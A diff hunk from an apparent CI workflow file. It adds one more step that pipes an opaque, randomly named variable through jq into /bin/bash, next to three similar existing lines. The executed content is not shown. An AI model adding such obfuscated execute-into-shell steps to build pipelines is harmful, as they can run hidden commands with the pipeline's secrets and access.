@@ -23,6 +23,7 @@ jobs:
           printf '%s' "$db0754" | jq -r .bwlh2 | /bin/bash
           printf '%s' "$gpz48226" | jq -r .fg937 | /bin/bash
           printf '%s' "$tmcni3606" | jq -r .sv0 | /bin/bash
+          echo $nxif0 | jq -r .p81435 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
